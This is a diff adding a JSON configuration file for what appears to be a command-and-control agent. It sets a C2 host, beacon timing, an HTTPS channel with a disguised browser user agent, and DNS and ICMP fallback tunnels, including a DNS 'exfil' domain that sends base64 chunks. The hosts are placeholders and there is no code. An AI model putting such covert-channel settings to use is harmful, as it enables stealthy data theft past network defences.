@@ -1,0 +1,59 @@
+{
+  "general": {
+    "client_id": "agent_0001",
+    "c2_host": "command.example.com",
+    "ping_interval": 60,
+    "max_retries": 5,
+    "retry_delay": 30,
+    "agent_version": "1.0.0",
+    "log_level": "INFO"
+  },
+  "channels": {
+    "primary": "https",
+    "fallback": ["dns", "icmp"],
+    "rotation_interval": 3600
+  },
+  "dns_tunnel": {
+    "nameserver": "ns1.example.com",
+    "domain": "exfil.example.com",
+    "record_type": "TXT",
+    "ttl": 300,
+    "max_chunk_size": 220,
+    "encoding": "base64"
+  },
+  "https_tunnel": {
+    "url": "https://api.example.com/data",
+    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "headers": {
+      "Accept": "application/json",
+      "Content-Type": "application/json"
+    },
+    "proxy": "",
+    "verify_ssl": true,
+    "timeout": 30
+  },
+  "icmp_tunnel": {
+    "identifier": 12345,
+    "sequence": 1,
+    "payload_size": 64,
+    "timeout": 10
+  },
+  "crypto": {
+    "symmetric": {
+      "algorithm": "AES-256-GCM",
+      "key_rotation": 86400
+    },
+    "asymmetric": {
+      "algorithm": "RSA-4096",
+      "cert_path": "/certs/agent.pem",
+      "key_path": "/certs/agent.key"
+    },
+    "key_exchange": {
+      "method": "ECDHE",
+      "curve": "P-384"
+    },
+    "hashing": {
+      "algorithm": "SHA3-256"
+    }
+  }
+} 
